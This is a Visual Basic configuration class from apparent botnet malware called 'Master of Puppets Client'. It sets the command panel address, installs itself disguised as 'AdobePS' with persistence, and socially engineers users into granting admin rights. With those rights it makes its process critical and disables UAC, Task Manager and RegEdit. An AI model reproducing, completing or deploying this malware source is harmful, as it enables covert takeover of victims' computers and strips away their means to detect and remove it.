'To encode Settings use Main.Decrypt("BASE64_HERE")
'True = Yes
'False = No
Public Class Config
    Public Panel As String = "http://localhost/" 'Address of the Panel
    Public Install As Boolean = True 'True = Install False = Don't Install
    Public Persistence As Boolean = True 'True = Persistent False = Basic (must install)
    Public InstallName As String = "AdobePS" 'What to install it as
    Public ElevateRights As Boolean = True 'If true will atempt to SE the user to give admin rights
    Public ElevateWaitTime As String = "30" 'Seconds after starting to Wait to try and get Admin
    Public MakeCritical As Boolean = True 'If gets admin will make the prosses critical, making it harder to kill
    Public DisableUAC As Boolean = True 'If its able to get Admin it will disable UAC
    Public DisableTaskMGR As Boolean = True 'If its able to get Admin it will disable TaskMgr
    Public DisableRegEdit As Boolean = True 'If its able to get Admin it will disable RegEdit
    Public Mutex As String = "e5c6e3b6a6b6" 'Used to detect if its already running (also works as bot version control, Make sure tohave the Mutex in the panels database)
    Public UserAgent As String = "Master of Puppets Client" 'UserAgent to connect to Panel (Must be same as panels!)
End Class
